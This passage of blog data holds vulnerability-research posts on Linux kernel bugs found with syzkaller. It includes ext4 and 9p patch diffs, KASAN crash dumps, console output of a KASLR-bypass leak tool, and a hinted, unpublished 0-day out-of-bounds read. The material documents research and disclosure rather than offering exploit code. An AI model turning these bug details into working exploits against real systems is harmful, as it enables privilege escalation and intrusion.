2018"},"timeToRead":1}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nLast time, I posted about 1-day vulnerability [CVE-2017-5123](http://kozistr.tech/2017/10/29/LKE-CVE-2017-5123.html), waitid() arbitrary R/W with null-deref on LK v4.13.x/~v4.14.0-rc4. It just happened because there's no any sanity check whether input space (*infop exactly) is kernel-land or user-land.\n\nAlso, you can find other good payloads that include sandbox-bypass like chrome-sandbox (actually, it's kinda different vulnerability, but...), fully-chained sth, etc...\n\nAnyway, recently, I've been spending some time fuzzing network and fs-related Linux kernel interfaces with *syzkaller* and *hand :)*.\n\nActually, I didn't have enough time to fully analyze vulnerabilities & complete fully-working payloads. So, this post describes how the bug was discovered and suggesting a possible way to exploit for EoP or leak info.\n\n## Founds\n\nOverally, there're some bugs at **(DCCP, XDP, SCTP)-socket, (ext4, 9p)-fs, mm** stuffs. Information Disclosure which can lead to *KASLR bypass* at **dccp_feat_xxx** and **hugetlb stuff**, **xdp_umem_create**, **p9_client_rpc**, etc... And **ext4_xattr_set_entry** [CVE-2018-10879] (6/25/2018, found by syzkaller), etc...\n\n## Targets\nMost of the bugs can be worked on *LK v4.16.x ~ v4.18.x-rc5 (latest)*.\n\n## 1-day bug\n\nMost of the bugs found by syzkaller and already patched by other people :).\n\n### ext4_xattr_set_entry\n\nCurrently, it was reported by ``Laura Pardo`` on 6/29/2018. [CVE-2018-10879](https://bugzilla.redhat.com/show_bug.cgi?id=1596806).\n\nWhen renaming a file in *a crafted ext4 image*, **UAF** triggered (dangling *last* is accessed). It just fixed by checking *last* & *ext4 magic number* whether it is valid.\n\n``file /fs/ext4/xattr.c L1598``\n\n*Before*\n```c\n    // LK v4.17.0+ // Fixed at LK v4.17.6\n\tfor (; !IS_LAST_ENTRY(last); last = EXT4_XATTR_NEXT(last)) {\n\t\tif (!last->e_value_inum && last->e_value_size) {\n\t\t\tsize_t offs = le16_to_cpu(last->e_value_offs);\n\t\t\tif (offs < min_offs)\n\t\t\t\tmin_offs = offs;\n\t\t}\n\t}\n```\n\n*After*\n```c\n    // LK v4.18.0-rc5\n    for (; !IS_LAST_ENTRY(last); last = next) {\n        next = EXT4_XATTR_NEXT(last);\n        if ((void *)next >= s->end) {\n            EXT4_ERROR_INODE(inode, \"corrupted xattr entries\");\n            ret = -EFSCORRUPTED;\n            goto out;\n        }\n        if (!last->e_value_inum && last->e_value_size) {\n            size_t offs = le16_to_cpu(last->e_value_offs);\n            if (offs < min_offs)\n                min_offs = offs;\n        }\n    }\n```\n\n``file /fs/ext4/xattr.c L230``\n\n*Before*\n```c\n\tif (buffer_verified(bh))\n\t\treturn 0;\n\tif (BHDR(bh)->h_magic != cpu_to_le32(EXT4_XATTR_MAGIC) ||\n\t    BHDR(bh)->h_blocks != cpu_to_le32(1))\n\t\tgoto errout;\n```\n\n*After*\n```c\n\tif (BHDR(bh)->h_magic != cpu_to_le32(EXT4_XATTR_MAGIC) ||\n\t    BHDR(bh)->h_blocks != cpu_to_le32(1))\n\t\tgoto errout;\n\tif (buffer_verified(bh))\n\t\treturn 0;\n```\n\nSyzkaller found this bug on 6/25/2018. Here's my syzkaller's report.\n\n```c\nBUG: KASAN: use-after-free in ext4_xattr_set_entry+0x34fc/0x3a30 fs/ext4/xattr.c:1598\nRead of size 4 at addr ffff88002f02b046 by task syz-executor14/14011\n\nCPU: 0 PID: 14011 Comm: syz-executor14 Not tainted 4.17.0+ #9\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n\nThe buggy address belongs to the page:\npage:ffffea0000bc0ac0 count:0 mapcount:-128 mapping:0000000000000000 index:0x1\nflags: 0x100000000000000()\nraw: 0100000000000000 ffffea0001174ec8 ffffea0001561e08 0000000000000000\nraw: 0000000000000001 0000000000000000 00000000ffffff7f 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff88002f02af00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff88002f02af80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n>ffff88002f02b000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n                                           ^\n ffff88002f02b080: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n ffff88002f02b100: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n```\n\n### p9_client_rpc\n\nsyz-bot reported this bug on 7/11/2018. Bug type is an **uninitialized variable**.\n\nIn short, we need to validate ``p9pdu_readf`` return-value before assigning *-ecode* to *err*. Because if ``p9pdu_readf`` returns ``-EFAULT``, then *err* remains uninitalized.\n\n``file /net/9p/client.c L560``\n\n*Before*\n```c \n...\n// LK v4.17.8\n} else {\n\t\terr = p9pdu_readf(req->rc, c->proto_version, \"d\", &ecode);\n\t\terr = -ecode;\n\n\t\tp9_debug(P9_DEBUG_9P, \"<<< RLERROR (%d)\\n\", -ecode);\n\t}\n...\n```\n\n*After*\n```c\nI think it's not fixed yet but reported.\n```\n\nHere's my syzkaller report.\n\n```c\n[  155.012783] kmemleak: 8 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\nBUG: memory leak\nferenced object 0xffff88006695ad80 (size 96):\n  comm \"syz-executor15\", pid 11123, jiffies 4294812752 (age 17.158s)\n  hex dump (first 32 bytes):\n    00 00 00 00 ad 4e ad de ff ff ff ff 00 00 00 00  .....N..........\n    ff ff ff ff ff ff ff ff a0 14 ba a1 ff ff ff ff  ................\n  backtrace:\n    [<00000000d71df12d>] p9_client_prepare_req net/9p/client.c:757 [inline]\n    [<00000000d71df12d>] p9_client_rpc+0x1bd/0x1410 net/9p/client.c:757\n    [<0000000062b42e0d>] p9_client_version net/9p/client.c:976 [inline]\n    [<0000000062b42e0d>] p9_client_create+0xd0b/0x16ce net/9p/client.c:1069\n    [<000000006460f58e>] v9fs_session_init+0x21a/0x1960 fs/9p/v9fs.c:400\n    [<00000000066f7e92>] v9fs_mount+0x79/0x860 fs/9p/vfs_super.c:135\n    [<0000000057fd6665>] mount_fs+0xa7/0x323 fs/super.c:1277\n    [<0000000008124149>] vfs_kern_mount.part.33+0xc9/0x4c0 fs/namespace.c:1037\n    [<00000000110ad253>] vfs_kern_mount fs/namespace.c:1027 [inline]\n    [<00000000110ad253>] do_new_mount fs/namespace.c:2518 [inline]\n    [<00000000110ad253>] do_mount+0x552/0x2ee0 fs/namespace.c:2848\n    [<000000005eddec36>] ksys_mount+0x125/0x140 fs/namespace.c:3064\n    [<00000000d4c47900>] __do_sys_mount fs/namespace.c:3078 [inline]\n    [<00000000d4c47900>] __se_sys_mount fs/namespace.c:3075 [inline]\n    [<00000000d4c47900>] __x64_sys_mount+0xba/0x150 fs/namespace.c:3075\n    [<0000000052f04bfc>] do_syscall_64+0x165/0x670 arch/x86/entry/common.c:290\n    [<000000005d846763>] entry_SYSCALL_64_after_hwframe+0x49/0xbe\n    [<000000005c780d9d>] 0xffffffffffffffff\n```\n\n### mm stuff\nThese bugs are what I found on LK v4.16.x. Here's my [post](http://kozistr.tech/2018/03/23/LK-kaslr_bypass.html).\n\nI dunno whether it was patched :). But, as I remembered, it's not a perfectly reliable bug, and there's kinda restriction. So, I'll skip this bug :).\n\n``Console Demo``\n\n```c\nzero@zer0day:/tmp$ uname -a\nLinux zer0day 4.16.0-rc5+ #19 SMP Sun Mar 18 20:44:40 KST 2018 x86_64 GNU/Linux\nzero@zer0day:/tmp$ ./leak\nzero@zer0day:/tmp$ ./leak 1\n[+] Found Kernel Base Address!\n[+] kbase : 0xffffffff89e00000\nzero@zer0day:/tmp$ su\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\nffffffff89e00000 T _text\nroot@zer0day:/tmp#\n```\n\n```\nzero@zer0day:/tmp$ ./leak\n...\nzero@zer0day:/tmp$ ./leak 1\n[+] Found Kernel Base Address!\n[+] kbase : 0xffffffffb2600000\nzero@zer0day:/tmp$ ls\nleak  leak.c\nzero@zer0day:/tmp$ su\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\nffffffffb2600000 T _text\nroot@zer0day:/tmp# uname -a\nLinux zer0day 4.16.0-rc7+ #22 SMP Thu Mar 29 16:46:52 KST 2018 x86_64 GNU/Linux\n```\n\nAnyway, successfully got kernel base address :)\n\n## 0-day bug\n\nIn this chapter, I gonna show information disclosure which can lead to *KASLR bypass*. This feature is used on many Linux distributions, So, maybe it is reliable on many Linux systems :| (i didn't test all of them, yet)\n\n### Bugs\n\nThis bug is ``slab-out-of-bounds`` *Read*. By using this, kernel-land addresses (heap) can be leaked. Found on LK ~v.4.18.x-rc5.\n\nHint for the vulnerability is ``fs``. There're no any validations for specific variable and it leads to *OOB*.\n\n### syslog\n\n```c\n[  421.466496] ==================================================================\n[  421.467034] BUG: KASAN: slab-out-of-bounds in xxx\n[  421.467350] Read of size 48059 at addr ffff88006bb9002d by task poc/2823\n[  421.467704] \n[  421.467795] CPU: 1 PID: 2823 Comm: poc Not tainted 4.18.0-rc5+ #23\n[  421.468128] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\n[  421.468626] Call Trace:\n...\n[  421.484432] RIP: 0033:0x7fc9130f2afa\n[  421.484623] Code: ... \n[  421.485702] RSP: 002b:0000000000700c18 EFLAGS: 00000206 ORIG_RAX: 00000000000000a5\n[  421.486100] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fc9130f2afa\n[  421.486469] RDX: 0000000000700d30 RSI: 0000000000700d40 RDI: 0000000000000000\n[  421.486838] RBP: 0000000000700d90 R08: 0000000000700c30 R09: 0000000000000001\n[  421.487205] R10: 0000000000000000 R11: 0000000000000206 R12: 00000000004005d0\n[  421.487571] R13: 00007ffcd7f02910 R14: 0000000000000000 R15: 0000000000000000\n[  421.487945] \n[  421.488030] The buggy address belongs to the page:\n[  421.488284] page:ffffea0001aee400 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0\n[  421.488789] flags: 0x100000000008000(head)\n[  421.489013] raw: 0100000000008000 dead000000000100 dead000000000200 0000000000000000\n[  421.489411] raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000\n[  421.489810] page dumped because: kasan: bad access detected\n[  421.490099] \n[  421.490183] Memory state around the buggy address:\n[  421.490436]  ffff88006bb91f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  421.490815]  ffff88006bb91f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  421.491188] >ffff88006bb92000: 00 00 00 00 fe fe fe fe fe fe fe fe fe fe fe fe\n[  421.491558]                                ^\n[  421.491786]  ffff88006bb92080: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe\n[  421.492163]  ffff88006bb92100: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe\n[  421.492530] ==================================================================\n...\n[ 1316.744978] kmemleak: 314 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n[ 1939.198134] kmemleak: 12219 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n```\n\n``file /sys/kernel/debug/kmemleak``\n\n```c\nunreferenced object 0xffff88005bfec000 (size 14280):\n  comm \"poc\", pid 3256, jiffies 4295094805 (age 1984.122s)\n  hex dump (first 32 bytes):\n    00 00 00 00 00 00 00 00 88 51 10 6b 00 88 ff ff  .........Q.k....\n    00 80 2c 6a 00 88 ff ff 00 c0 2c 6a 00 88 ff ff  ..,j......,j....\n...\nunreferenced object 0xffff88006b105188 (size 96):\n  comm \"poc\", pid 3256, jiffies 4295094805 (age 1984.122s)\n  hex dump (first 32 bytes):\n    00 00 00 00 ad 4e ad de ff ff ff ff 6b 6b 6b 6b  .....N......kkkk\n    ff ff ff ff ff ff ff ff a0 14 7a 98 ff ff ff ff  ..........z.....\n```\n\n### Demo\n\nI roughly make a PoC code, So, currently, it should be run by ``root`` privilege. But, maybe it can also be run by ``normal user`` privilege after a few fixes.\n\n```c\nroot@zer0day:/tmp# uname -a\nLinux zer0day 4.18.0-rc5+ #23 SMP Tue Jul 17 22:48:05 KST 2018 x86_64 GNU/Linux\nroot@zer0day:/tmp# ls -al\ntotal 24\ndrwxrwxrwt  2 root root 4096 Jul 20 09:51 .\ndrwxr-xr-x 24 root root 4096 Jul 17 14:19 ..\n-rwxr-xr-x  1 zero zero 8307 Jul 20 09:18 poc\n-rw-r--r--  1 zero zero 1222 Jul 20 09:18 poc.c\nroot@zer0day:/tmp# ./poc\n...\n[lots of kaddr leaks...]\n```\n\n~~Hmm... not cool stuff :(~~ \n\n## Conclusion\n\nThere're more bugs that I and fuzzer found like UAFs, OOBs, etc... But, some of them can't be reproducible :( or can run under some conditions...\n\nAnyway, the latest LK version is *v4.18.0-rc5* (7/20/2018).\nAnd i think the Linux kernel still has a lot of security issues and they're just exposed to unprivileged users. It means many interfaces need to be tested and some features should be restricted by default.\n","excerpt":"TL;DR Last time, I posted about 1-day vulnerability CVE-2017-5123, waitid() arbitrary R/W with null-deref on LK v4.13.x/~v4.14.0-rc4. It ju…","fields":{"slug":"/Modern-Linux-Kernel-0day-Unkind-Exploitations-Review/"},"frontmatter":{"date":"Jul 20, 2018","title":"Modern Linux Kernel 0,1-day Unkind-Exploitations Review","tags":["Security","Linux-Kernel"],"update":"Jul 20, 2018"},"timeToRead":10}},{"node":{"rawMarkdownBody":"\n## _decode_session6 - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc7.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#1 stuck for 22s! [syz-executor3:10493]\nModules linked in:\nirq event stamp: 50309\nhardirqs last  enabled at (50308): [<ffffffff9fc00a60>] restore_regs_and_return_to_kernel+0x0/0x30\nhardirqs last disabled at (50309): [<ffffffff9fc00964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (94): [<ffffffff9e747190>] tun_napi_alloc_frags drivers/net/tun.c:1481 [inline]\nsoftirqs last  enabled at (94): [<ffffffff9e747190>] tun_get_user+0x1cf0/0x3a30 drivers/net/tun.c:1827\nsoftirqs last disabled at (106): [<ffffffff9e74810a>] tun_get_user+0x2c6a/0x3a30 drivers/net/tun.c:1941\nCPU: 1 PID: 10493 Comm: syz-executor3 Not tainted 4.17.0-rc7+ #8\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:__read_once_size include/linux/compiler.h:188 [inline]\nRIP: 0010:check_kcov_mode kernel/kcov.c:69 [inline]\nRIP: 0010:write_comp_data+0x1e/0x70 kernel/kcov.c:122\nRSP: 0018:ffff8800529de598 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000002 RBX: 0000000000000003 RCX: ffffffff9f3bdcb9\nRDX: 0000000000000000 RSI: 0000000000000011 RDI: 0000000000000001\nRBP: ffffffffa04e0220 R08: ffff88002bbedc40 R09: ffff8800529de748\nR10: ffffed000a53bcf3 R11: ffff8800529de79f R12: 0000000000000000\nR13: 0000000000000001 R14: 000000000000000a R15: 000000000000004e\nFS:  00007f0f35952700(0000) GS:ffff88006cf00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 000000002000f000 CR3: 0000000052436000 CR4: 00000000000006e0\nCall Trace:\n __sanitizer_cov_trace_switch+0x4f/0x90 kernel/kcov.c:224\n _decode_session6+0x4b9/0x11d0 net/ipv6/xfrm6_policy.c:156\n __xfrm_decode_session+0x64/0x120 net/xfrm/xfrm_policy.c:2368\n xfrm_decode_session_reverse include/net/xfrm.h:1214 [inline]\n icmpv6_route_lookup+0x39b/0x710 net/ipv6/icmp.c:372\n icmp6_send+0x1862/0x2940 net/ipv6/icmp.c:551\n icmpv6_param_prob+0x27/0x40 net/ipv6/icmp.c:598\n ip6_tlvopt_unknown net/ipv6/exthdrs.c:106 [inline]\n ip6_parse_tlv+0x694/0x770 net/ipv6/exthdrs.c:190\n ipv6_parse_hopopts+0x280/0x570 net/ipv6/exthdrs.c:863\n ipv6_rcv+0xdee/0x22b0 net/ipv6/ip6_input.c:196\n __netif_receive_skb_core+0x25c5/0x3560 net/core/dev.c:4592\n __netif_receive_skb+0x27/0x1c0 net/core/dev.c:4657\n netif_receive_skb_internal+0x12d/0x7c0 net/core/dev.c:4731\n napi_frags_finish net/core/dev.c:5172 [inline]\n napi_gro_frags+0x60b/0xbc0 net/core/dev.c:5245\n tun_get_user+0x2c93/0x3a30 drivers/net/tun.c:1950\n tun_chr_write_iter+0xb0/0x147 drivers/net/tun.c:1995\n call_write_iter include/linux/fs.h:1784 [inline]\n do_iter_readv_writev+0x62e/0x8a0 fs/read_write.c:680\n do_iter_write+0x183/0x5e0 fs/read_write.c:959\n vfs_writev+0x1f1/0x360 fs/read_write.c:1004\n do_writev+0xf7/0x2e0 fs/read_write.c:1039\n do_syscall_64+0x165/0x670 arch/x86/entry/common.c:287\n entry_SYSCALL_64_after_hwframe+0x49/0xbe\nRIP: 0033:0x459040\nRSP: 002b:00007f0f35951b60 EFLAGS: 00000293 ORIG_RAX: 0000000000000014\nRAX: ffffffffffffffda RBX: 00000000000000fc RCX: 0000000000459040\nRDX: 0000000000000001 RSI: 00007f0f35951bd0 RDI: 00000000000000fc\nRBP: 00007f0f35951bd0 R08: 0000000000000000 R09: 0000000000000000\nR10: 000000000000fdef R11: 0000000000000293 R12: 0000000000000001\nR13: 00000000000006ac R14: 0000000000000000 R15: 00000000006e9100\nCode: fc ff ff e8 65 92 ce ff 90 90 90 90 90 65 4c 8b 04 25 c0 de 01 00 65 8b 05 a0 c4 fb 62 a9 00 01 1f 00 75 58 41 8b 80 e0 11 00 00 <83> f8 03 75 4c 49 8b 80 e8 11 00 00 45 8b 80 e4 11 00 00 48 81 \n```\n\nI'll update a post later...\n\n**End**\n\n## rb_insert_color - general page fault\n\nFound on LK v4.17.0+. lead to null-dereference.\n\n### Call Trace (Dump)\n\n```c\nkasan: CONFIG_KASAN_INLINE enabled\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN PTI\nCPU: 0 PID: 2795 Comm: poc Not tainted 4.17.0+ #9\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:rb_insert_color+0x17e/0x1010\nCode: 22 09 00 00 49 8b 2c 24 40 f6 c5 01 0f 85 0a 02 00 00 49 bf 00 00 00 00 00 fc ff df 48 8d 45 08 48 89 e9 48 89 c2 48 c1 ea 03 <42> 80 3c 3a 00 0f 85 c8 08 00 00 4c 8b 75 08 4d 39 e6 0f 84 35 02\nRSP: 0018:ffff88006bfdec88 EFLAGS: 00010002\nRAX: 0000000000000008 RBX: 1ffff1000d7fbd95 RCX: 0000000000000000\nRDX: 0000000000000001 RSI: ffffffffb413c640 RDI: ffff88006b932bf8\nRBP: 0000000000000000 R08: fffffbfff6571e2d R09: ffff88006bf4ea50\nR10: fffffbfff6571e2c R11: ffffffffb2b8f163 R12: ffff88006bf4ea50\nR13: ffff88006b932bf8 R14: 0000000000000246 R15: dffffc0000000000\nFS:  000000000166c880(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007fff25499b98 CR3: 000000006c210000 CR4: 00000000000006f0\n```\n\n\n## __handle_mm_fault - general page fault\n\nFound on LK v4.17.0+. lead to null-dereference.\n\n### Call Trace (Dump)\n\n```c\n[  387.942047] kasan: CONFIG_KASAN_INLINE enabled\n[  387.943245] kasan: GPF could be caused by NULL-ptr deref or user memory access\n[  387.944498] general protection fault: 0000 [#1] SMP KASAN PTI\n[  387.945408] CPU: 0 PID: 2898 Comm: poc Not tainted 4.17.0+ #9\n[  387.946810] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  387.948388] RIP: 0010:__handle_mm_fault+0x7c6/0x3eb0\n[  387.949421] Code: 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 b6 2e 00 00 48 b8 00 00 00 00 00 fc ff df 4c 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 a5 2e 00 00 49 8b 07 48 89 84 24 d0 00 00 00 48\n[  387.953249] RSP: 0000:ffff880048457728 EFLAGS: 00010206\n[  387.954442] RAX: dffffc0000000000 RBX: ffff8800484577c8 RCX: ffffffffaff47487\n[  387.956002] RDX: 000181014000907b RSI: 0000000000000000 RDI: ffff8800484577f8\n[  387.957588] RBP: 1ffff1000908aeed R08: ffff880066e4c2c0 R09: 0000000000000000\n[  387.959145] R10: 0000000000000001 R11: 0000000000000001 R12: ffff8800000003d8\n[  387.960709] R13: ffffffffb33e97e0 R14: 000ffffffffff000 R15: 000c080a000483d8\n[  387.961896] kasan: CONFIG_KASAN_INLINE enabled\n[  387.962193] FS:  000000c4238aa468(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\n[  387.962199] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  387.962204] CR2: 000000000047b544 CR3: 000000006af1e000 CR4: 00000000000006f0\n[  387.962214] DR0: 0000000020000000 DR1: 0000000020000000 DR2: 0000000000000000\n[  387.962892] kasan: GPF could be caused by NULL-ptr deref or user memory access\n[  387.964386] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000600\n[  387.964390] Call Trace:\n[  387.964406]  ? __mark_inode_dirty+0x41c/0x1570\n[  387.964441]  ? vmf_insert_mixed_mkwrite+0x90/0x90\n[  387.964455]  ? find_held_lock+0x33/0x1b0\n[  387.973075]  ? mark_held_locks+0xc1/0x140\n[  387.973718]  ? ktime_get_coarse_real_ts64+0x1a8/0x230\n[  387.974602]  ? save_trace+0x300/0x300\n[  387.975738]  ? timespec_trunc+0xea/0x180\n[  387.976498]  ? compat_put_timespec64+0x1a0/0x1a0\n[  387.977383]  ? do_raw_spin_unlock+0xac/0x310\n[  387.978225]  ? find_held_lock+0x33/0x1b0\n[  387.978990]  ? pipe_write+0xaf9/0xeb0\n[  387.979706]  ? check_flags.part.37+0x420/0x420\n[  387.980561]  ? __lock_is_held+0xad/0x140\n[  387.981324]  ? lock_acquire+0x1b3/0x4a0\n[  387.981919]  ? __do_page_fault+0x3e6/0xe30\n[  387.982832]  ? save_trace+0x300/0x300\n[  387.983662]  ? __lock_acquire+0x4f90/0x4f90\n[  387.984614]  ? __vfs_write+0xfa/0x890\n[  387.985448]  ? __lock_is_held+0xad/0x140\n[  387.986351]  ? handle_mm_fault+0x15a/0x410\n[  387.987265]  ? find_vma+0x2d/0x170\n[  387.988039]  ? __do_page_fault+0x672/0xe30\n[  387.988952]  ? mm_fault_error+0x360/0x360\n[  387.989846]  ? ksys_write+0x192/0x240\n[  387.990665]  ? async_page_fault+0x8/0x30\n[  387.991531]  ? do_page_fault+0xc1/0x720\n[  387.992378]  ? do_syscall_64+0x8d/0x670\n[  387.993220]  ? __do_page_fault+0xe30/0xe30\n[  387.994144]  ? do_syscall_64+0x488/0x670\n[  387.995020]  ? syscall_slow_exit_work+0x4d0/0x4d0\n[  387.996072]  ? syscall_return_slowpath+0x4e0/0x4e0\n[  387.997150]  ? syscall_return_slowpath+0x342/0x4e0\n[  387.998154]  ? entry_SYSCALL_64_after_hwframe+0x59/0xbe\n[  387.999002]  ? async_page_fault+0x8/0x30\n[  387.999685]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  388.000574]  ? async_page_fault+0x8/0x30\n[  388.001180]  ? async_page_fault+0x1e/0x30\n```\n\n\n## bad page map - bug\n\nFound in LK v4.17.0+.\n\n### Call Trace (Dump)\n\n```c\n[  697.425122] kernel BUG at include/linux/mm.h:499!\n[  697.425136] invalid opcode: 0000 [#1] SMP KASAN PTI\n[  697.425147] CPU: 1 PID: 19619 Comm: syz-executor11 Tainted: G    B             4.17.0+ #9\n[  697.425153] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  697.425165] RIP: 0010:release_pages+0x12d2/0x22c0\n[  697.425168] Code: 0f 85 ab 0e 00 00 48 8b 44 24 08 45 31 e4 48 8b 28 e9 e3 fe ff ff e8 fd 89 dd ff 48 c7 c6 e0 af 8c 8f 48 89 ef e8 2e 9e 09 00 <0f> 0b e8 e7 89 dd ff 49 8d 6d ff e9 65 f0 ff ff e8 d9 89 dd ff 4c \n[  697.425363] RSP: 0018:ffff880045d3e2f0 EFLAGS: 00010286\n[  697.425372] RAX: 0000000000000000 RBX: dffffc0000000000 RCX: 0000000000000000\n[  697.425378] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffffed0008ba7c50\n[  697.425385] RBP: ffffea0000003600 R08: ffff8800457842c0 R09: ffffed000ce63d06\n[  697.425391] R10: ffffed000ce63d06 R11: ffff88006731e837 R12: 0000000000000000\n[  697.425398] R13: ffffea0000003634 R14: ffffed0008ba7c90 R15: 1ffff10008ba7c78\n[  697.425406] FS:  0000000000ba1940(0000) GS:ffff880067300000(0000) knlGS:0000000000000000\n[  697.425413] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  697.425419] CR2: 00007f95ce09e349 CR3: 000000005236a000 CR4: 00000000000006e0\n[  697.425426] Call Trace:\n[  697.425447]  ? __pagevec_lru_add_fn+0x2570/0x2570\n[  697.425459]  ? check_chain_key+0x3c0/0x3c0\n[  697.425471]  ? console_unlock+0x774/0xed0\n[  697.425483]  ? check_flags.part.37+0x420/0x420\n[  697.425496]  ? widen_string+0xd7/0x2a0\n[  697.425509]  ? format_decode+0xa50/0xa50\n[  697.425525]  ? check_chain_key+0x3c0/0x3c0\n[  697.425535]  ? perf_trace_lock+0xde/0x950\n[  697.425544]  ? down_trylock+0x46/0x70\n[  697.425552]  ? lock_acquire+0x1b3/0x4a0\n[  697.425566]  ? check_chain_key+0x3c0/0x3c0\n[  697.425577]  ? vprintk_emit+0x982/0xb80\n[  697.425586]  ? lock_acquire+0x1b3/0x4a0\n[  697.425597]  ? check_flags.part.37+0x420/0x420\n[  697.425612]  ? irq_work_claim+0xa4/0xc0\n[  697.425624]  ? irq_work_queue+0xb0/0x120\n[  697.425635]  ? wake_up_klogd+0xc5/0x110\n[  697.425645]  ? down_trylock+0x46/0x70\n[  697.425662]  ? check_chain_key+0x3c0/0x3c0\n[  697.425674]  ? __is_insn_slot_addr+0x251/0x3a0\n[  697.425682]  ? lock_acquire+0x1b3/0x4a0\n[  697.425693]  ? check_flags.part.37+0x420/0x420\n[  697.425706]  ? __lock_acquire+0x4f90/0x4f90\n[  697.425715]  ? vprintk_emit+0x383/0xb80\n[  697.425732]  ? deref_stack_reg+0x110/0x110\n[  697.425742]  ? page_mapping+0x479/0x840\n[  697.425752]  ? __page_mapcount+0x410/0x410\n[  697.425764]  ? __is_insn_slot_addr+0x27a/0x3a0\n[  697.425776]  ? __free_insn_slot+0x6a0/0x6a0\n[  697.425789]  ? rcu_is_watching+0x81/0x130\n[  697.425799]  ? printk+0xa7/0xcf\n[  697.425810]  ? _rcu_barrier_trace+0x450/0x450\n[  697.425819]  ? mark_held_locks+0xc1/0x140\n[  697.425836]  ? perf_trace_lock+0xde/0x950\n[  697.425851]  ? check_chain_key+0x3c0/0x3c0\n[  697.425859]  ? __writepage+0xe0/0xe0\n[  697.425875]  ? dump_stack+0x1df/0x229\n[  697.425885]  ? PageHuge+0x175/0x2a0\n[  697.425896]  ? vma_kernel_pagesize+0xa0/0xa0\n[  697.425905]  ? dump_stack+0x1e9/0x229\n[  697.425917]  ? dump_stack+0x1f3/0x229\n[  697.425926]  ? find_next_bit+0x101/0x130\n[  697.425942]  ? free_pages_and_swap_cache+0x385/0x5c0\n[  697.425956]  ? free_page_and_swap_cache+0x6d0/0x6d0\n[  697.425966]  ? check_chain_key+0x3c0/0x3c0\n[  697.425978]  ? unmap_page_range+0x1722/0x1fc0\n[  697.425990]  ? check_flags.part.37+0x420/0x420\n[  697.426007]  ? do_raw_spin_unlock+0xac/0x310\n[  697.426019]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  697.426031]  ? _vm_normal_page+0x112/0x270\n[  697.426042]  ? __pte_alloc_kernel+0x270/0x270\n[  697.426056]  ? tlb_flush_mmu_free+0xb2/0x150\n[  697.426070]  ? unmap_page_range+0x172c/0x1fc0\n[  697.426106]  ? _vm_normal_page+0x270/0x270\n[  697.426123]  ? cpumask_any_but+0xa1/0xc0\n[  697.426138]  ? flush_tlb_mm_range+0x20c/0x3e0\n[  697.426147]  ? __unwind_start+0x61c/0x8e0\n[  697.426163]  ? native_flush_tlb_others+0x630/0x630\n[  697.426173]  ? save_trace+0x300/0x300\n[  697.426188]  ? __delete_object+0x140/0x1c0\n[  697.426199]  ? check_flags.part.37+0x420/0x420\n[  697.426213]  ? find_held_lock+0x33/0x1b0\n[  697.426227]  ? pagevec_lru_move_fn+0x240/0x330\n[  697.426239]  ? check_flags.part.37+0x420/0x420\n[  697.426252]  ? do_raw_spin_unlock+0xac/0x310\n[  697.426264]  ? uprobe_munmap+0x138/0x400\n[  697.426275]  ? do_raw_spin_trylock+0x1b0/0x1b0\n[  697.426285]  ? uprobe_mmap+0xc60/0xc60\n[  697.426309]  ? unmap_single_vma+0x198/0x300\n[  697.426324]  ? unmap_vmas+0x11c/0x1f0\n[  697.426337]  ? exit_mmap+0x27f/0x530\n[  697.426348]  ? __ia32_sys_munmap+0x70/0x70\n[  697.426374]  ? mmput+0x1c7/0x4e0\n[  697.426385]  ? 